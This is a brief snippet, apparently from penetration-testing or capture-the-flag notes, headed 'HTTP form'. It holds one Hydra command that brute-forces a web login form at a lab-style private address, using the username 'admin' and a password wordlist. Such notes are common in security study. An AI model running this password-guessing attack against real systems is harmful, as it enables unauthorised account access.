### HTTP form
```
hydra -l admin -P /usr/share/nmap/nselib/data/passwords.lst 10.10.10.43 http-post-form "/department/login.php:password=^PASS^&username=^USER^:Invalid Password!"
```
